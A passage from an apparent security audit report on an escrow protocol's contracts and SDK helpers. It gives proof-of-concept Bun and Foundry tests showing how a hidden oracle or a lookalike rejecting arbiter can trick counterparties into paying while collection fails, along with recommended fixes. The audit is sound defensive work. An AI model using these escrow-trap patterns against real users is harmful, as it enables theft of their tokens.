##### cd sdks/ts

Path: ``

```bash
cd sdks/ts
```

##### bun install

Path: ``

```bash
bun install
```

##### bun test tests/unit/POC_oracle_helper_hidden_authorizer_807126a8.test.ts --timeout 120000

Path: ``

```bash
bun test tests/unit/POC_oracle_helper_hidden_authorizer_807126a8.test.ts --timeout 120000
```

##### POC_oracle_helper_hidden_authorizer_807126a8.test.ts

Path: `sdks/ts/tests/unit/POC_oracle_helper_hidden_authorizer_807126a8.test.ts`

```typescript
import { afterAll, beforeAll, beforeEach, expect, test } from "bun:test";
import { parseAbiParameters, parseEther } from "viem";
import MockERC20Permit from "../fixtures/MockERC20Permit.json";
import { setupTestEnvironment, type TestContext } from "../utils/setup";
import { teardownTestEnvironment } from "../utils/teardownTestEnvironment";

/**
 * @title POC: TrustedOracle helper strips the real settlement authority
 * @notice Proof Statement: Proves that the shipped minimal-client helpers can show a counterparty only the inner
 * ERC20 payment demand of a TrustedOracle escrow while hiding that the escrow creator is also the oracle who must
 * approve collection; after relying on the helper, the counterparty pays real tokens, collection fails, and the
 * creator reclaims the original escrow.
 */

let testContext: TestContext;

beforeAll(async () => {
  testContext = await setupTestEnvironment();
});

beforeEach(async () => {
  if (testContext.anvilInitState) {
    await testContext.testClient.loadState({
      state: testContext.anvilInitState,
    });
  }
});

afterAll(async () => {
  await teardownTestEnvironment(testContext);
});

test("extractDemandData and getEscrowAndDemand hide an attacker-controlled oracle", async () => {
  const escrowAmount = parseEther("10");
  const paymentAmount = parseEther("5");
  const latestBlock = await testContext.testClient.getBlock();
  const expirationTime = latestBlock.timestamp + 3600n;

  const readBalance = async (token: `0x${string}`, holder: `0x${string}`) =>
    await testContext.testClient.readContract({
      address: token,
      abi: MockERC20Permit.abi,
      functionName: "balanceOf",
      args: [holder],
    });

  const paymentDemandAbi = parseAbiParameters("(address token, uint256 amount, address payee)");
  const trustedOracleDemandAbi = parseAbiParameters("(address oracle, bytes data)");

  const initialAliceTokenA = await readBalance(testContext.mockAddresses.erc20A, testContext.alice.address);
  const initialBobTokenA = await readBalance(testContext.mockAddresses.erc20A, testContext.bob.address);
  const initialAliceTokenB = await readBalance(testContext.mockAddresses.erc20B, testContext.alice.address);
  const initialBobTokenB = await readBalance(testContext.mockAddresses.erc20B, testContext.bob.address);

  const innerPaymentDemand = testContext.alice.client.erc20.payment.encodeObligation(
    {
      address: testContext.mockAddresses.erc20B,
      value: paymentAmount,
    },
    testContext.alice.address,
  );

  const wrappedTrustedOracleDemand = testContext.alice.client.arbiters.general.trustedOracle.encodeDemand({
    oracle: testContext.alice.address,
    data: innerPaymentDemand,
  });

  const { attested: escrowEvent } = await testContext.alice.client.erc20.escrow.default.permitAndCreate(
    {
      address: testContext.mockAddresses.erc20A,
      value: escrowAmount,
    },
    {
      arbiter: testContext.addresses.trustedOracleArbiter,
      demand: wrappedTrustedOracleDemand,
    },
    expirationTime,
  );

  const escrowAttestation = await testContext.bob.client.getAttestation(escrowEvent.uid);
  const sanitizedDemand = testContext.bob.client.extractDemandData(paymentDemandAbi, escrowAttestation);

  expect(sanitizedDemand[0].token.toLowerCase()).toBe(testContext.mockAddresses.erc20B.toLowerCase());
  expect(sanitizedDemand[0].amount).toBe(paymentAmount);
  expect(sanitizedDemand[0].payee.toLowerCase()).toBe(testContext.alice.address.toLowerCase());
  expect("oracle" in (sanitizedDemand[0] as Record<string, unknown>)).toBe(false);

  expect(() => testContext.bob.client.extractDemandData(trustedOracleDemandAbi, escrowAttestation)).toThrow();

  const escrowData = await testContext.bob.client.erc20.escrow.default.getObligation(escrowEvent.uid);
  const fullyDecodedDemand = testContext.bob.client.decodeDemand({
    arbiter: escrowData.data.arbiter,
    demand: escrowData.data.demand,
  });

  expect((fullyDecodedDemand.decoded as { oracle: `0x${string}` }).oracle.toLowerCase()).toBe(
    testContext.alice.address.toLowerCase(),
  );

  const { attested: fulfillmentEvent } = await testContext.bob.client.erc20.payment.approveAndPay(
    {
      address: testContext.mockAddresses.erc20B,
      value: paymentAmount,
    },
    testContext.alice.address,
    escrowEvent.uid,
  );

  const fulfillmentAttestation = await testContext.bob.client.getAttestation(fulfillmentEvent.uid);
  const [linkedEscrow, sanitizedDemandFromFulfillment] = await testContext.bob.client.getEscrowAndDemand(
    paymentDemandAbi,
    fulfillmentAttestation,
  );

  expect(linkedEscrow.uid).toBe(escrowEvent.uid);
  expect(sanitizedDemandFromFulfillment[0].payee.toLowerCase()).toBe(testContext.alice.address.toLowerCase());
  expect("oracle" in (sanitizedDemandFromFulfillment[0] as Record<string, unknown>)).toBe(false);

  expect(async () =>
    await testContext.bob.client.erc20.escrow.default.collect(escrowEvent.uid, fulfillmentEvent.uid)).toThrow();

  await testContext.testClient.increaseTime({ seconds: 3601 });
  await testContext.testClient.mine({ blocks: 1 });

  const reclaimHash = await testContext.alice.client.erc20.escrow.default.reclaim(escrowEvent.uid);
  await testContext.testClient.waitForTransactionReceipt({ hash: reclaimHash });

  const finalAliceTokenA = await readBalance(testContext.mockAddresses.erc20A, testContext.alice.address);
  const finalBobTokenA = await readBalance(testContext.mockAddresses.erc20A, testContext.bob.address);
  const finalAliceTokenB = await readBalance(testContext.mockAddresses.erc20B, testContext.alice.address);
  const finalBobTokenB = await readBalance(testContext.mockAddresses.erc20B, testContext.bob.address);

  expect(finalAliceTokenA).toBe(initialAliceTokenA);
  expect(finalBobTokenA).toBe(initialBobTokenA);
  expect(finalAliceTokenB).toBe(initialAliceTokenB + paymentAmount);
  expect(finalBobTokenB).toBe(initialBobTokenB - paymentAmount);
});
```

#### Recommendation

Do not special-case `TrustedOracleArbiter` inside generic demand helpers.

Primary fix:
- have the helper return the full decoded `(arbiter, demand)` pair, or
- verify `arbiter == addresses.trustedOracleArbiter` and return the full `TrustedOracleArbiterDemandData { oracle, data }` instead of silently stripping `oracle`.

Example direction:

```typescript
const demand = decodeDemandWithAddresses({ arbiter: arbiterDemand.arbiter, demand: arbiterDemand.demand }, addresses);
return demand;
```

If a convenience helper for trusted-oracle inner payloads is still desired, expose it under an explicit name such as `extractTrustedOracleInnerDemand()` and document that it intentionally discards the oracle identity.

#### Assumptions

- [x] The victim relies on `extractDemandData()` / `getEscrowAndDemand()` instead of manually decoding the raw demand bytes.
- [x] The fulfillment is a separate on-chain action with independent value, such as a payment obligation or attestation.
- [x] The escrow is reclaimable after expiry.

#### Predicted Invalid Reasons

- The oracle address is on-chain, the SDK already has `decodeDemand()`, and major payment flows are supposed to use atomic settlement. This is at most a convenience-helper/documentation issue.

<a id="finding-alka-10"></a>
### ALKA-10 — TrustedOracle arbitration status helpers treat any fulfillment-level event as the final decision

#### Summary

`TrustedOracleArbiter` keys settlement by `keccak256(fulfillmentUid, demand.data)`, but the TypeScript status helpers collapse arbitration state to `(fulfillmentUid, oracle)` and can treat a stale or wrong-key `ArbitrationMade` event as final. This can suppress the repair transaction needed for `collect()` and strand valid fulfillments until expiry.

#### Context Files

##### TrustedOracleArbiter.sol

Path: `contracts/src/arbiters/TrustedOracleArbiter.sol`
Highlight lines: 1

```solidity
mapping(address => mapping(bytes32 => bool)) decisions;

event ArbitrationMade(
    bytes32 indexed decisionKey,
    bytes32 indexed fulfillmentUid,
    address indexed oracle,
    bool decision
);

function check(Attestation memory fulfillment, bytes memory demand, bytes32) public view returns (bool) {
    DemandData memory demand_ = abi.decode(demand, (DemandData));
    bytes32 decisionKey = keccak256(abi.encodePacked(fulfillment.uid, demand_.data));
    return decisions[demand_.oracle][decisionKey];
}
```

##### trustedOracle.ts

Path: `sdks/ts/src/clients/arbiters/general/trustedOracle.ts`
Highlight lines: 1

```typescript
const logs = await viemClient.getLogs({
  address: addresses.trustedOracleArbiter,
  event: arbitrationMadeEvent,
  args: { fulfillmentUid, oracle },
  fromBlock: "earliest",
  toBlock: "latest",
});

if (logs.length > 0 && logs[0]) {
  return logs[0].args;
}
```

##### trustedOracle.ts

Path: `sdks/ts/src/clients/arbiters/general/trustedOracle.ts`
Highlight lines: 1

```typescript
const existingLogs = await viemClient.getLogs({
  address: addresses.trustedOracleArbiter,
  event: arbitrationMadeEvent,
  args: {
    fulfillmentUid: awd.attestation.uid,
    oracle: viemClient.account.address,
  },
  fromBlock: "earliest",
  toBlock: "latest",
});

return existingLogs.length === 0 ? awd : null;
```

##### README.md

Path: `sdks/ts/README.md`
Highlight lines: 1

```markdown
clientCharlie.arbiters.general.trustedOracle.arbitrate(fulfillment.attested.uid, demand, true)
```

#### Proof of Concept

Create a Bun test that emits a wrong-key `ArbitrationMade` event using the outer encoded demand, then confirm `checkExistingArbitration()`, `waitForArbitration()`, and `arbitrateMany({ mode: "allUnarbitrated" })` treat the fulfillment as settled even though `TrustedOracleArbiter.check()` is still `false`; `collect()` still reverts and `reclaim()` succeeds after expiry.

##### POC_oracle.test_ea46e151.ts

Path: `sdks/ts/tests/unit/POC_oracle.test_ea46e151.ts`

```typescript
import { afterAll, beforeAll, beforeEach, expect, test } from "bun:test";
import { encodeAbiParameters, parseAbiParameters } from "viem";
import { abi as trustedOracleArbiterAbi } from "../../src/contracts/arbiters/TrustedOracleArbiter";
import MockERC20Permit from "../fixtures/MockERC20Permit.json";
import { setupTestEnvironment, type TestContext } from "../utils/setup";
import { teardownTestEnvironment } from "../utils/teardownTestEnvironment";

let testContext: TestContext;

beforeAll(async () => {
  testContext = await setupTestEnvironment();
});

beforeEach(async () => {
  if (testContext.anvilInitState) {
    await testContext.testClient.loadState({
      state: testContext.anvilInitState,
    });
  }
});

afterAll(async () => {
  await teardownTestEnvironment(testContext);
});

/**
 * @title POC: TrustedOracle status helpers accept a wrong-key arbitration event as final
 * @notice Proof Statement: Prove that if the oracle records `ArbitrationMade` with the outer TrustedOracle
 * demand bytes instead of the inner `demand.data` bytes, then `checkExistingArbitration`,
 * `waitForArbitration`, and default `arbitrateMany({ mode: "allUnarbitrated" })` all treat the
 * fulfillment as already arbitrated even though `TrustedOracleArbiter.check()` is still false,
 * `collect()` reverts, and the escrower can reclaim after expiry.
 */
test("wrong-key arbitration event poisons status helpers and default dedupe", async () => {
  const paymentAmount = 10n;
  const innerDemand = encodeAbiParameters(parseAbiParameters("(string mockDemand)"), [{ mockDemand: "foo" }]);
  const outerDemand = testContext.alice.client.arbiters.general.trustedOracle.encodeDemand({
    oracle: testContext.charlie.address,
    data: innerDemand,
  });

  const { attested: escrow } = await testContext.alice.client.erc20.escrow.default.permitAndCreate(
    {
      address: testContext.mockAddresses.erc20A,
      value: paymentAmount,
    },
    {
      arbiter: testContext.addresses.trustedOracleArbiter,
      demand: outerDemand,
    },
    BigInt(Math.floor(Date.now() / 1000) + 60),
  );

  const { attested: fulfillment } = await testContext.bob.client.stringObligation.doObligation(
    "foo",
    undefined,
    escrow.uid,
  );

  const requestHash = await testContext.bob.client.arbiters.general.trustedOracle.requestArbitration(
    fulfillment.uid,
    testContext.charlie.address,
    outerDemand,
  );
  await testContext.testClient.waitForTransactionReceipt({ hash: requestHash });

  const wrongDecisionHash = await testContext.charlie.client.arbiters.general.trustedOracle.arbitrate(
    fulfillment.uid,
    outerDemand,
    true,
  );
  await testContext.testClient.waitForTransactionReceipt({ hash: wrongDecisionHash });

  const existing = await testContext.bob.client.arbiters.general.trustedOracle.checkExistingArbitration(
    fulfillment.uid,
    testContext.charlie.address,
  );
  expect(existing?.fulfillmentUid).toBe(fulfillment.uid);
  expect(existing?.oracle).toBe(testContext.charlie.address);
  expect(existing?.decision).toBe(true);

  const waited = await testContext.bob.client.arbiters.general.trustedOracle.waitForArbitration(
    fulfillment.uid,
    testContext.charlie.address,
  );
  expect(waited.fulfillmentUid).toBe(fulfillment.uid);
  expect(waited.oracle).toBe(testContext.charlie.address);
  expect(waited.decision).toBe(true);

  const onchainAccepted = await testContext.testClient.readContract({
    address: testContext.addresses.trustedOracleArbiter,
    abi: trustedOracleArbiterAbi.abi,
    functionName: "check",
    args: [await testContext.bob.client.getAttestation(fulfillment.uid), outerDemand, escrow.uid],
  });
  expect(onchainAccepted).toBe(false);

  let arbitrationCallbackCalled = false;
  const { decisions, unwatch } = await testContext.charlie.client.arbiters.general.trustedOracle.arbitrateMany(
    async () => {
      arbitrationCallbackCalled = true;
      return true;
    },
    {
      mode: "allUnarbitrated",
      pollingInterval: 50,
    },
  );
  unwatch();

  expect(arbitrationCallbackCalled).toBe(false);
  expect(decisions).toHaveLength(0);

  await expect(testContext.bob.client.erc20.escrow.default.collect(escrow.uid, fulfillment.uid)).rejects.toThrow();

  const aliceBalanceBeforeReclaim = await testContext.testClient.readContract({
    address: testContext.mockAddresses.erc20A,
    abi: MockERC20Permit.abi,
    functionName: "balanceOf",
    args: [testContext.alice.address],
  });
  const bobBalanceBeforeReclaim = await testContext.testClient.readContract({
    address: testContext.mockAddresses.erc20A,
    abi: MockERC20Permit.abi,
    functionName: "balanceOf",
    args: [testContext.bob.address],
  });

  await testContext.testClient.increaseTime({ seconds: 61 });
  await testContext.testClient.mine({ blocks: 1 });

  const reclaimHash = await testContext.alice.client.erc20.escrow.default.reclaim(escrow.uid);
  await testContext.testClient.waitForTransactionReceipt({ hash: reclaimHash });

  const aliceBalanceAfterReclaim = await testContext.testClient.readContract({
    address: testContext.mockAddresses.erc20A,
    abi: MockERC20Permit.abi,
    functionName: "balanceOf",
    args: [testContext.alice.address],
  });
  const bobBalanceAfterReclaim = await testContext.testClient.readContract({
    address: testContext.mockAddresses.erc20A,
    abi: MockERC20Permit.abi,
    functionName: "balanceOf",
    args: [testContext.bob.address],
  });

  expect(aliceBalanceAfterReclaim).toBe(aliceBalanceBeforeReclaim + paymentAmount);
  expect(bobBalanceAfterReclaim).toBe(bobBalanceBeforeReclaim);
});
```

#### Recommendation

Thread the exact demand context through every status helper. Accept the outer demand bytes, derive `innerData = decodeDemand(demand).data`, recompute `decisionKey = keccak256(abi.encodePacked(fulfillmentUid, innerData))`, and filter or validate events against that key before concluding that arbitration already exists.

At minimum:
- add a `demand` parameter to `checkExistingArbitration()` and `waitForArbitration()`;
- make `arbitrateMany()` dedupe on `decisionKey`, not only `fulfillmentUid`/`oracle`;
- add regression tests where an `ArbitrationMade` event exists for the same fulfillment/oracle but the wrong inner demand.

Fix checklist:

- [ ] Add a `demand` parameter to `checkExistingArbitration()` and `waitForArbitration()` and validate the indexed `decisionKey` before returning an event.
- [ ] Recompute `decisionKey = keccak256(abi.encodePacked(fulfillmentUid, decodeDemand(demand).data))` in the status helpers and compare it to the matched `ArbitrationMade` log.
- [ ] Deduplicate `pastUnarbitrated` and `allUnarbitrated` requests in `arbitrateMany()` by the same demand-specific key used for the on-chain write.
- [ ] Change the public `arbitrate()` path to normalize the outer demand to `demand.data` internally before submitting the arbitration transaction.

#### Assumptions

- [x] The integration relies on the SDK status helpers or `allUnarbitrated` / `pastUnarbitrated` filtering instead of recomputing `decisionKey` itself.
- [x] A prior `ArbitrationMade` event can exist for the same `(fulfillmentUid, oracle)` pair but for a different `demand.data`.
- [x] The escrow can expire before the mismatch is manually repaired.

#### Predicted Invalid Reasons

- Only the oracle can emit that event for its own address.
- The contract itself still enforces the correct decision key.
- Passing the wrong bytes or reusing a fulfillment across different demands is user error, not a protocol bug.

<a id="finding-alka-7"></a>
### ALKA-7 — AttestationReferenceEscrowObligation can only deliver irrevocable validation attestations even when validationRevocable is true

#### Summary

`AttestationReferenceEscrowObligation` stores `validationRevocable` as a settlement term, mints the validation attestation itself with that bit, and treats it as part of `check()`. But the produced validation is attested by the escrow contract, and there is no reachable path for a user to revoke that UID, so a "revocable" validation is effectively non-revocable in practice.

#### Context Files

##### AttestationReferenceEscrowObligation.sol

Path: `contracts/src/obligations/escrow/default/AttestationReferenceEscrowObligation.sol`
Highlight lines: 28

```solidity
struct ObligationData {
    address arbiter;
    bytes demand;
    bytes32 attestationUid;
    uint64 validationExpirationTime;
    bool validationRevocable;
}
```

##### AttestationReferenceEscrowObligation.sol

Path: `contracts/src/obligations/escrow/default/AttestationReferenceEscrowObligation.sol`
Highlight lines: 74

```solidity
bytes32 validationUid = eas.attest(
    AttestationRequest({
        schema: VALIDATION_SCHEMA,
        data: AttestationRequestData({
            recipient: to,
            expirationTime: decoded.validationExpirationTime,
            revocable: decoded.validationRevocable,
            refUID: decoded.attestationUid,
            data: abi.encode(decoded.attestationUid),
            value: 0
        })
    })
);
```

##### AttestationReferenceEscrowObligation.sol

Path: `contracts/src/obligations/escrow/default/AttestationReferenceEscrowObligation.sol`
Highlight lines: 100

```solidity
return escrow.attestationUid == demandData.attestationUid
    && escrow.validationExpirationTime == demandData.validationExpirationTime
    && escrow.validationRevocable == demandData.validationRevocable && escrow.arbiter == demandData.arbiter
    && keccak256(escrow.demand) == keccak256(demandData.demand);
```

#### Proof of Concept

Save the Foundry test below as `contracts/test/unit/obligations/escrow/default/POC_AttestationReferenceEscrowObligation_05bb0f95.t.sol` and run `forge test --match-path test/unit/obligations/escrow/default/POC_AttestationReferenceEscrowObligation_05bb0f95.t.sol -vv` to confirm the validation is minted with `revocable = true` yet cannot be revoked through any reachable external path.

##### POC_AttestationReferenceEscrowObligation_05bb0f95.t.sol

Path: `contracts/test/unit/obligations/escrow/default/POC_AttestationReferenceEscrowObligation_05bb0f95.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {
    AttestationReferenceEscrowObligation
} from "@src/obligations/escrow/default/AttestationReferenceEscrowObligation.sol";
import {BaseEscrowObligation} from "@src/BaseEscrowObligation.sol";
import {StringObligation} from "@src/obligations/StringObligation.sol";
import {TrivialArbiter} from "@src/arbiters/TrivialArbiter.sol";
import {RevocableArbiter} from "@src/arbiters/attestation-properties/RevocableArbiter.sol";
import {
    IEAS,
    Attestation,
    AttestationRequest,
    AttestationRequestData,
    RevocationRequest,
    RevocationRequestData
} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
import {ISchemaResolver} from "@eas/resolver/ISchemaResolver.sol";
import {EASDeployer} from "@test/utils/EASDeployer.sol";

/**
 * @title POC: Reference escrow advertises revocability it cannot deliver
 * @notice Proof Statement: Prove that setting `validationRevocable = true` makes
 * `AttestationReferenceEscrowObligation.check` and `RevocableArbiter.check`
 * accept the future validation as revocable, but the collected validation UID
 * cannot be revoked by any reachable external actor because EAS only accepts the
 * original attester as revoker and this escrow exposes no usable validation-revoke path.
 */
contract POC_AttestationReferenceEscrowObligation_05bb0f95 is Test {
    bytes4 internal constant ACCESS_DENIED_SELECTOR = bytes4(keccak256("AccessDenied()"));

    AttestationReferenceEscrowObligation internal escrowObligation;
    StringObligation internal stringObligation;
    TrivialArbiter internal trivialArbiter;
    RevocableArbiter internal revocableArbiter;
    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;

    address internal requester;
    address internal fulfiller;
    address internal originalAttester;
    address internal referencedRecipient;

    bytes32 internal referencedAttestationUid;

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        (eas, schemaRegistry) = easDeployer.deployEAS();

        escrowObligation = new AttestationReferenceEscrowObligation(eas, schemaRegistry);
        stringObligation = new StringObligation(eas, schemaRegistry);
        trivialArbiter = new TrivialArbiter();
        revocableArbiter = new RevocableArbiter();

        requester = makeAddr("requester");
        fulfiller = makeAddr("fulfiller");
        originalAttester = makeAddr("originalAttester");
        referencedRecipient = makeAddr("referencedRecipient");

        bytes32 testSchema = schemaRegistry.register("string testData", ISchemaResolver(address(0)), true);

        vm.prank(originalAttester);
        referencedAttestationUid = eas.attest(
            AttestationRequest({
                schema: testSchema,
                data: AttestationRequestData({
                    recipient: referencedRecipient,
                    expirationTime: 0,
                    revocable: true,
                    refUID: bytes32(0),
                    data: abi.encode("referenced attestation"),
                    value: 0
                })
            })
        );
    }

    function testValidationFlagIsReusableButValidationIsNotExternallyRevocable() public {
        uint64 validationExpiration = uint64(block.timestamp + 7 days);
        AttestationReferenceEscrowObligation.ObligationData memory escrowData =
            AttestationReferenceEscrowObligation.ObligationData({
                arbiter: address(trivialArbiter),
                demand: bytes(""),
                attestationUid: referencedAttestationUid,
                validationExpirationTime: validationExpiration,
                validationRevocable: true
            });

        vm.prank(requester);
        bytes32 escrowUid = escrowObligation.doObligation(escrowData, uint64(block.timestamp + 30 days));

        Attestation memory escrowAttestation = eas.getAttestation(escrowUid);
        assertTrue(
            escrowObligation.check(escrowAttestation, abi.encode(escrowData), bytes32(0)),
            "reference escrow treats revocability as part of the promised output"
        );

        vm.prank(fulfiller);
        bytes32 fulfillmentUid = stringObligation.doObligation(
            StringObligation.ObligationData({item: "fulfilled", schema: bytes32(0)}), escrowUid
        );

        vm.prank(fulfiller);
        bytes32 validationUid = abi.decode(escrowObligation.collect(escrowUid, fulfillmentUid), (bytes32));

        Attestation memory validation = eas.getAttestation(validationUid);
        assertEq(validation.attester, address(escrowObligation), "the escrow contract becomes the validation attester");
        assertEq(validation.recipient, fulfiller, "collection delivers the validation to the fulfiller");
        assertEq(validation.refUID, referencedAttestationUid, "validation references the promised attestation");
        assertEq(validation.expirationTime, validationExpiration, "validation keeps the configured expiration");
        assertTrue(validation.revocable, "validation carries the configured revocable bit");
        assertTrue(
            revocableArbiter.check(
                validation, abi.encode(RevocableArbiter.DemandData({revocable: true})), bytes32(0)
            ),
            "downstream revocability checks accept the validation"
        );

        bytes32 validationSchema = escrowObligation.VALIDATION_SCHEMA();

        vm.prank(requester);
        vm.expectRevert(ACCESS_DENIED_SELECTOR);
        eas.revoke(
            RevocationRequest({
                schema: validationSchema,
                data: RevocationRequestData({uid: validationUid, value: 0})
            })
        );

        vm.prank(fulfiller);
        vm.expectRevert(ACCESS_DENIED_SELECTOR);
        eas.revoke(
            RevocationRequest({
                schema: validationSchema,
                data: RevocationRequestData({uid: validationUid, value: 0})
            })
        );

        vm.prank(fulfiller);
        vm.expectRevert(ACCESS_DENIED_SELECTOR);
        escrowObligation.revoke(validation);

        vm.prank(fulfiller);
        vm.expectRevert(BaseEscrowObligation.InvalidEscrowAttestation.selector);
        escrowObligation.reclaim(validationUid);

        vm.prank(fulfiller);
        vm.expectRevert(BaseEscrowObligation.InvalidEscrowAttestation.selector);
        escrowObligation.collect(validationUid, fulfillmentUid);

        assertEq(eas.getAttestation(validationUid).revocationTime, 0, "validation remains live after all reachable calls");
    }
}

```

#### Recommendation

Reject or sanitize `validationRevocable = true` unless the contract also provides a real revoke API for produced validation attestations.

Primary fix:

```solidity
if (decoded.validationRevocable) revert UnsupportedRevocableValidation();
```

Alternatively, add a public lifecycle method that authorizes and performs `eas.revoke(...)` on produced validation UIDs from the escrow contract. Until such a path exists, the produced validation attestation should always be minted with `revocable = false`.

#### Assumptions

- [x] The escrow contract itself is the attester of the validation attestation minted in `_releaseEscrow()`.
- [x] EAS revocation still requires the original attester, and this contract exposes no reachable revoke path for collected validation UIDs.
- [x] `check()` treats `validationRevocable` as part of the escrowed promise.
- [x] `RevocableArbiter` accepts the resulting attestation based on the `revocable` bit.
- [x] The docs and unit tests describe revocability as configured by escrow data, but they do not verify a working revocation path.

#### Predicted Invalid Reasons

- `validationRevocable` only means the EAS attestation carries `revocable = true`.
- The contract never promised a user-facing revoke function.

<a id="finding-alka-20"></a>
### ALKA-20 — Generic demand helpers let arbitrary arbiters masquerade as benign TrustedOracle payloads

#### Summary

`extractDemandData()` and `getEscrowAndDemand()` assume every escrow uses `TrustedOracleArbiter`, so attacker-shaped demand bytes can be shown as a benign inner payload while the real arbiter remains hostile. A counterparty who trusts the helper can perform value-bearing fulfillment before collection fails under the actual arbiter.

#### Context Files

##### index.ts

Path: `sdks/ts/src/index.ts`
Highlight lines: 483

```typescript
const arbiterDemandAbi = parseAbiParameters("(address arbiter, bytes demand)");
const arbiterDemand = decodeAbiParameters(arbiterDemandAbi, escrowAttestation.data)[0];

const trustedOracleDemandAbi = parseAbiParameters("(address oracle, bytes data)");
const trustedOracleDemand = decodeAbiParameters(trustedOracleDemandAbi, arbiterDemand.demand)[0];

return decodeAbiParameters(demandAbi, trustedOracleDemand.data);
```

##### default.ts

Path: `sdks/ts/src/clients/obligations/erc20/escrow/default.ts`
Highlight lines: 104

```typescript
create: async (price: Erc20, item: Demand, expiration: bigint) => {
  const hash = await writeContract(viemClient, {
    address: addresses.escrowObligation,
    functionName: "doObligation",
    args: [{ token: price.address, amount: price.value, arbiter: item.arbiter, demand: item.demand }, expiration],
  });
}
```

##### BaseEscrowObligation.sol

Path: `contracts/src/BaseEscrowObligation.sol`
Highlight lines: 93

```solidity
(address arbiter, bytes memory demand) = decodeCondition(escrow.data);
if (!IArbiter(arbiter).check(fulfillment, demand, escrow.uid)) {
    revert InvalidFulfillment();
}
```

##### demandParsing.ts

Path: `sdks/ts/src/utils/demandParsing.ts`
Highlight lines: 167

```typescript
export const decodeDemandWithAddresses = (
  demand: Demand,
  addresses: ChainAddresses,
  extraDecoders: Partial<DecodersRecord> = {},
): DecodedDemandResult => {
  const decoders = createDecodersFromAddresses(addresses, extraDecoders);
  return decodeDemand(demand, decoders);
};
```

#### Proof of Concept

Reproduced with a rejecting arbiter that ABI-shapes its demand as `(address oracle, bytes data)`. The helper path shows a benign ERC20 payment demand, Bob pays first, `collect()` fails under the real arbiter, and the escrow creator later reclaims the escrowed asset.

##### RejectingLookalikeArbiter.sol

Path: `contracts/src/poc/RejectingLookalikeArbiter.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Attestation} from "@eas/Common.sol";
import {ERC165} from "@openzeppelin/contracts/utils/introspection/ERC165.sol";
import {IERC165} from "@openzeppelin/contracts/utils/introspection/IERC165.sol";
import {IArbiter} from "../IArbiter.sol";

contract RejectingLookalikeArbiter is ERC165, IArbiter {
    function check(Attestation memory, bytes memory, bytes32) external pure returns (bool) {
        return false;
    }

    function supportsInterface(bytes4 interfaceId) public view override(ERC165, IERC165) returns (bool) {
        return interfaceId == type(IArbiter).interfaceId || super.supportsInterface(interfaceId);
    }
}
```

##### Build and run PoC

Path: `shell`

```bash
cd /home/user/workspace/alkahest/contracts
timeout 300 forge build src/poc/RejectingLookalikeArbiter.sol --skip test script

cd /home/user/workspace/alkahest/sdks/ts
timeout 300 bun test tests/poc/POC_genericDemandHelpers_4843bd5a.test.ts --timeout 120000
```

##### Test result

Path: `shell`

```text
(pass) malicious arbiter demand is shown as a benign payment demand before real loss

 1 pass
 0 fail
```

#### Recommendation

Replace the hardcoded trusted-oracle decoding with the generic arbiter-dispatch logic that already exists in `decodeDemandWithAddresses()`. At minimum:
- return the arbiter address alongside the decoded result,
- reject unknown arbiters unless the caller explicitly opts in, and
- never reinterpret arbitrary demand bytes as trusted-oracle data unless `arbiter == addresses.trustedOracleArbiter`.

Fix checklist:

- [ ] Return the decoded arbiter address from `extractDemandData()` and `getEscrowAndDemand()`.
- [ ] Verify `arbiter == addresses.trustedOracleArbiter` before unwrapping TrustedOracle demand bytes.
- [ ] Decode non-TrustedOracle escrows with `decodeDemandWithAddresses()` and surface unknown arbiters instead of stripping arbiter identity.

#### Assumptions

- [x] The victim uses the shipped helper as their demand-inspection path.
- [x] The attacker is free to choose the escrow’s arbiter, which the protocol and SDK both allow.
- [x] The fulfillment itself has independent value and occurs before collection, which is realistic for payment and attestation obligations.

#### Predicted Invalid Reasons

- Users must verify the arbiter address before trusting an escrow.

<a id="finding-alka-27"></a>
### ALKA-27 — Ethereum and GenLayer decoders classify the zero arbiter as ReferencesEscrowArbiter instead of unknown

#### Summary

On `Ethereum` and `GenLayer Bradbury`, the shipped SDK presets map `referencesEscrowArbiter` to `0x0000000000000000000000000000000000000000`, and the TS/Rust decoders still classify that zero address as a known `ReferencesEscrowArbiter` instead of `Unknown`. That suppresses the unknown-warning signal in demand inspection and can mislead counterparties into escrows that cannot be collected through a real arbiter; if `expirationTime == 0`, reclaim is disabled.

#### Context Files

##### TypeScript preset addresses

Path: `sdks/ts/src/config.ts`
Highlight lines: 243, 302

```typescript
"GenLayer Bradbury": {
  ...
  referencesEscrowArbiter: zeroAddress,
  ...
},
"Ethereum": {
  ...
  referencesEscrowArbiter: zeroAddress,
  ...
}
```

##### TypeScript decoder registration

Path: `sdks/ts/src/utils/demandParsing.ts`
Highlight lines: 103

```typescript
if (addresses.referencesEscrowArbiter) {
  decoders[addresses.referencesEscrowArbiter.toLowerCase() as Address] =
    decodeReferencesEscrowDemand as DemandDecoder;
}
```

##### TypeScript unknown handling

Path: `sdks/ts/src/utils/demandParsing.ts`
Highlight lines: 128

```typescript
export const decodeDemand = (_demand: `0x${string}`): Record<string, never> => ({});

if (!decoder) {
  return { arbiter: demand.arbiter, decoded: { raw: demand.demand }, isUnknown: true };
}
const decoded = decoder(demand.demand);
```

##### Rust decoder registration

Path: `sdks/rs/src/clients/arbiters/mod.rs`
Highlight lines: 107

```rust
registry.register_fn(addresses.references_escrow_arbiter, |_, _, _: Bytes| {
    Ok(DecodedDemand::ReferencesEscrowArbiter)
});
```

##### On-chain collection check

Path: `contracts/src/BaseEscrowObligationUnconditional.sol`
Highlight lines: 94

```solidity
(address arbiter, bytes memory demand) = decodeCondition(escrow.data);
if (!IArbiter(arbiter).check(fulfillment, demand, escrow.uid)) {
    revert InvalidFulfillment();
}
```

##### On-chain reclaim guard

Path: `contracts/src/BaseEscrowObligationUnconditional.sol`
Highlight lines: 128

```solidity
if (attestation.expirationTime == 0) revert UnauthorizedCall();
```

#### Proof of Concept

- The shipped presets set `referencesEscrowArbiter` to `zeroAddress` / `Address::ZERO` on `Ethereum` and `GenLayer Bradbury`.
- The TS and Rust decoder registries still register that zero address as a known arbiter, so the generic inspection path does not fall back to `Unknown`.
- A malicious escrow can use `arbiter = 0x0` and `expirationTime == 0`; collection fails against the zero arbiter and reclaim is disabled.

##### ts-preset-zero-arbiter

